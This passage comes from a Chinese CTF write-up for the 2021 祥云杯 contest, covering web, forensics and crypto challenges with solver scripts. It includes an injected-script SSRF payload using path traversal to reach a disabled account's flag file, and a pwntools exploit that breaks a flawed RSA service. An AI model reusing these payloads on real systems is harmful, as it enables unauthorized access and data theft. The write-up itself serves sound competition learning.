AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014852340.png"></p>
<h2 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h2><p><strong>考点：SSRF</strong></p>
<p>观察数据库可发现flag文件在superuser账号中，而此账号被禁用了，admin的密码在附件中可得到，登录后利用ssrf将superuser账号的flag文件添加到admin账号下，对<code>content</code>的限制可以利用数组进行bypass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content[]=&lt;script&gt;location.href=&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=../files/flag&amp;checksum=be5a14a8e504a66979f6938338b0662c&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202006427.png">再读取即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/files/be5a14a8e504a66979f6938338b0662c</span><br></pre></td></tr></table></figure>

<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202102574.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="层层取证"><a href="#层层取证" class="headerlink" title="层层取证"></a>层层取证</h2><p>层层套娃取证(确信)<br>给了一个内存和一个虚拟磁盘的取证，先看磁盘，取证大师打开提示存在bitlocker加密<br>用Passware Kit Forensic 2021 v1 (64-bit)能直接梭出来bitlocker的秘钥<br>方法是把001解压出来，然后把2.ntfs放进去，再选择有内存镜像，导入这道题的内存镜像，然后等待……</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/1.png"></p>
<p>当然之后也发现内存中也可以找到，但是已经不重要<br>得到549714-116633-006446-278597-176000-708532-618101-131406<br>解开发现E盘存在一个流量包<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/2.png"><br>在udp里面找到一个rar，里面包含了一个flag.docx<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/3.png"></p>
<p>然后导出，说压缩包密码是开机密码，然后去看俺的另一篇博客<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/4.png"></p>
<p>这里提取的是92EFA7F9F2740956D51157F46521F941<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/5.png"></p>
<p>密码xiaoming_handsome，cmd5解一下就行了(不会有人没开会员吧)<br>解压之后发现docx还有密码<br>实在找不到了的时候，挂载一下，发现hint<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/6.png"></p>
<p>然后去仿真。。。。。。嗯仿真不出来<br>照着<a target="_blank" rel="noopener" href="https://www.freesion.com/article/51701409948/#DDE01_8">https://www.freesion.com/article/51701409948/#DDE01_8</a> 都不行<br>然后就去导出内存，还是看👴的博客<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100928.png"></p>
<p>找到然后密码<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100957.png"></p>
<p>可以自己去操作放大看，偏移294435180，宽510<br>结合用户名，得到xiaoming1314，解压成功<br>得到flag</p>
<blockquote>
<p>flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2}</p>
</blockquote>
<h2 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h2><p>改zip解压，在_rels下发现key和love，key是妥妥的零宽<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101149.png"></p>
<p>解压之后是两张图，其实这里可以不用解压直接读CRC，可惜写的脚本有问题，还是解压了<br>然后写个脚本，2进制的ASCII</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">path = <span class="string">&#x27;C:\\Users\\mumuzi\\AppData\\Local\\Temp\\鸣雏恋_2dad763070b79f50c4635a906359909a\\鸣雏恋\\_rels\\love\\out\\&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">129488</span>)):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(path+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    s = img.getpixel((<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">str</span>(s) == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">str</span>(s) == <span class="string">&#x27;3&#x27;</span>):</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    s+=i</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)==<span class="number">8</span>:</span><br><span class="line">        rflag += <span class="built_in">chr</span>(<span class="built_in">int</span>(s,<span class="number">2</span>))</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(rflag)</span><br></pre></td></tr></table></figure>

<p>得到base64的png图，图片最下面就是flag<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101245.png"></p>
<blockquote>
<p>flag{57dd74fb21bb1aee50f19421bf836f23}</p>
</blockquote>
<h2 id="考古"><a href="#考古" class="headerlink" title="考古"></a>考古</h2><p>最后的xor我是真的服气这一来怎么直接想得到太浪费时间了<br>先imageinfo，发现是XP，然后pslist列出表，发现cmd正在运行，cmdscan看一下cmd<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101338.png"></p>
<p>然后Filescan |grep “Oneclickcleanup.exe”，然后dumpfiles -Q 0x00000000017bcbc0 -D ./<br>一共是得到一个dat和一个iso，dat直接拖IDA32<br>发现是两个异或，第一个异或是存放地址，第二个异或是异或的数据<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101419.png"></p>
<p>key是this_a_key，data就是数据，把data导出，写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;this_a_key&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#flags = [0x37,0x52,0x35,0x37,0x30,0x02,0x2A,0x06,0x00,0x17,0x00,0x1B,0x49,0x12,0x31,0x05,0x7F,0x38,0x00,0x0D,0x00,0x01,0x07,0x14,0x2C,0x3D,0x1E,0x07,0x09,0x59,0x21,0x1B,0x0C,0x01,0x2C,0x3D,0x0B,0x0E,0x08,0x09,0x18,0x09,0x1D,0x16,0x2C]</span></span><br><span class="line">flags = [<span class="number">0xA4</span>,<span class="number">0xA7</span>,<span class="number">0x78</span>,<span class="number">0x93</span>,<span class="number">0xFE</span>,<span class="number">0xD0</span>,<span class="number">0x45</span>,……中间略,<span class="number">0x79</span>,<span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x5F</span>,<span class="number">0x61</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flags)):</span><br><span class="line">    flag += <span class="built_in">str</span>(<span class="built_in">hex</span>(flags[i] ^ <span class="built_in">ord</span>(s[i%<span class="number">10</span>])))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;ffff.dot&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(flag.encode())</span><br></pre></td></tr></table></figure>

<p>得到的ffff.dot用notepad++打开，将16进制转ascii<br>为什么要保存为.dot，因为我在复现我知道是dot我乐意<br>然后WPS打开发现提示版本过低，用office打开<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101513.png"></p>
<p>然后就瞎试，比如看16进制，从200h-1800h和1800h到最后是一样的，两者相比较什么的，都试过了，没出继续看内存文件。<br>最后。。。想着可打印ascii的词频和异或，结果异或出了<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101540.png"></p>
<p>因为长度只有31位，爆破一下0-f，竟然不对，然后想着一共出现了两次，再去试试，还是不对。麻了<br>因为是dot文档，又想着zip解压直接看源文件，然后再来异或<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101608.png"></p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101624.png"></p>
<p>???我可去你的吧居然还有一段<br>最终得到flag</p>
<blockquote>
<p>flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309}</p>
</blockquote>
<p>麻了</p>
<h2 id="ChieftainsSecret"><a href="#ChieftainsSecret" class="headerlink" title="ChieftainsSecret"></a>ChieftainsSecret</h2><p>首先给了一个文档和一张图片，文档就是题目描述，图片的话是一个古时候的电话<br>搜了一下是怎么用的<br><a target="_blank" rel="noopener" href="https://haokan.baidu.com/v?pd=wisenatural&amp;vid=15222023905414500076">https://haokan.baidu.com/v?pd=wisenatural&amp;vid=15222023905414500076</a><br>Jpg图片后面还有rar，foremost提取出来，发现是一堆TLE5501生成的数据，搜了一下他是一个角度的传感器，给了sinP,cosP,sinN,cosN<br>本着不会做就乱试+搜公式的原则，发现想要计算出角度，就得找到tan，于是萌生了sinP/cosP,sinN/cosN,(sinP-sinN)/(cosP-cosN)的想法，想知道角度，就再加上一个ATAN函数，除出来是弧度，就再乘以一个57.3°<br>顺便看了油管的视频，研究了一下四个值的变换<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=y68IdqZs4PM">https://www.youtube.com/watch?v=y68IdqZs4PM</a><br>最后在看第三个想法的时候恍然大悟，搞出来也正好是11个峰<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101753.png"></p>
<p>上图的意思就是ATAN((sinP-sinN)/(cosP-cosN))*57.3,然后因为ATAN的范围是-90°~90°，所以才会出现到90°的时候马上反转成负的，然后负的又接着变为正的，总之，第一个90°之后，后面的值要加180.第2个90°之后，后面加270，妈的简直找惨了。<br>得到的数字大概为210 210 280 230 160 260 190 90 140 160 210<br>然后去下载一个量角器(PicPickPortable)，发现2正好是90°，所以我直接就排除1了，然后一个个去量，下图举个例<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101824.png"></p>
<p>对应7，然后其他的也依次如图<br>得到77085962457</p>
<blockquote>
<p>所以flag为flag{77085962457}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="myrsa"><a href="#myrsa" class="headerlink" title="myrsa"></a>myrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"> </span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">alpha = <span class="number">2.0314159265358979</span></span><br><span class="line">WELCOME = <span class="string">&#x27;Welcome to use my better RSA!!!!!!So, what do you want now?&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;1. encry \n2. getflag\n3. exit&#x27;</span></span><br><span class="line">String = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span class="string">&#x27;&#x27;</span>.join([String[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(String)-<span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) ])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>],STR[<span class="number">4</span>:],HASH</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p,q = getPrime(KEYSIZE),getPrime(KEYSIZE)</span><br><span class="line">        e = <span class="number">0x10001</span></span><br><span class="line">        <span class="keyword">if</span> gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    key = [getPrime(<span class="built_in">int</span>(KEYSIZE*alpha)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p,q,e),key</span><br><span class="line"> </span><br><span class="line"><span class="comment"># encrypto</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encry</span>(<span class="params">message,key,p,q,e</span>):</span></span><br><span class="line">    k1,k2 = key[random.randint(<span class="number">0</span>,<span class="number">127</span>)],key[random.randint(<span class="number">0</span>,<span class="number">127</span>)]</span><br><span class="line">    x = p**<span class="number">2</span> * (p + <span class="number">3</span>*q - <span class="number">1</span> ) + q**<span class="number">2</span> * (q + <span class="number">3</span>*p - <span class="number">1</span>) </span><br><span class="line">    y = <span class="number">2</span>*p*q + p + q</span><br><span class="line">    z = k1 + k2 </span><br><span class="line">    c = <span class="built_in">pow</span>(b2l(message),e,p*q)</span><br><span class="line">    <span class="keyword">return</span> x * c + y * c + z</span><br><span class="line"> </span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">flag,key,p,q,e</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encry(flag,key,p,q,e)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        START,END,HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&#x27;SHA-256(?+&#123;&#125;) == &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(END,HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._send(<span class="string">&quot;I&#x27;m a CryptoRookie,so my Crypto system take time, please wait a minute XD!&quot;</span>)</span><br><span class="line">        (p,q,e),key = key_gen()</span><br><span class="line">        flag  = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        self._send(<span class="string">&#x27;This is my public key:\nn = &#123;&#125;\ne = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(p*q),<span class="built_in">str</span>(e)))</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            self._send(menu)</span><br><span class="line">            COI = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            <span class="keyword">if</span> COI == <span class="number">1</span> :</span><br><span class="line">                self._send(<span class="string">&#x27;Give me your message&#x27;</span>)</span><br><span class="line">                message = self._recv()</span><br><span class="line">                self._send(<span class="string">&#x27;Your encry message:&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(message,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">2</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;This is your favourite:\n&#x27;</span>)</span><br><span class="line">                self._send(<span class="built_in">str</span>(encry(flag,key,p,q,e)))</span><br><span class="line">            <span class="keyword">elif</span> COI == <span class="number">3</span>:</span><br><span class="line">                self._send(<span class="string">&#x27;Bye~&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>刚开始这题也太慢了吧，首先是个$pow$验证，然后产生密钥给了$n,e$,给了两个选项可以选择明文加密，或者直接得到$flag$的密文，跟进加密函数$C=m^e(x+y)+(z_1+z_2)$,而$x+y$可以化简得到$x+y={(p+q)}^3-{(p+q)}^2+(p+q)+4n$，可以认为$-{(p+q)}^2+(p+q)+4n$很小，比如说传$m=1$，得到${(p+q)}^3-{(p+q)}^2+(p+q)+4n+(z_1+z_2)=C$,此时直接对$C$开三次方可以得到$(p+q)$的一个大概值，本地测试的话相差也就几千上万，爆破即可，但是需要找个验证点，可以联立$p+q=l,p*q=n$解方程，如果方程存在解则对应$p+q$成立，也可以通过构造${(p-q)}^2={(p+q)}^2-4n$，当${(p+q)}^2-4n$可以完全开方时成立。得到$p+q$后，求${(p+q)}^3-{(p+q)}^2+(p+q)+4n$,显然这个远远大于$z_1+z_2$,所以$m^e=C//(x+y)$,再$rsa$解密，综上$exp$如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=remote(<span class="string">&#x27;47.104.85.225&#x27;</span>,<span class="number">49877</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">end,sha</span>):</span></span><br><span class="line">    String = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> String:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> String:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> String:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> String:</span><br><span class="line">                    s=(a+b+c+d).encode()+end</span><br><span class="line">                    <span class="keyword">if</span> sha256(s).hexdigest()==sha:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line">                    </span><br><span class="line">p.recvuntil(<span class="string">&#x27;SHA-256(?+&#x27;</span>)</span><br><span class="line">end=p.recv(<span class="number">12</span>)</span><br><span class="line"><span class="built_in">print</span>(end)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">sha=p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(sha)</span><br><span class="line">xxx=<span class="built_in">pow</span>(end,sha)</span><br><span class="line">p.sendline(xxx)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;n = &#x27;</span>)</span><br><span class="line">n=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your message&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your encry message:\n&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">p_q=iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(p_q)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p_q=p_q-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> iroot(p_q*p_q-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        M=p_q*p_q*p_q-p_q*p_q+p_q+<span class="number">4</span>*n</span><br><span class="line">        pp=(p_q+iroot(p_q*p_q-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line">        <span class="keyword">assert</span> n%pp==<span class="number">0</span></span><br><span class="line">        q=n//pp</span><br><span class="line">        <span class="keyword">break</span></span><br><span 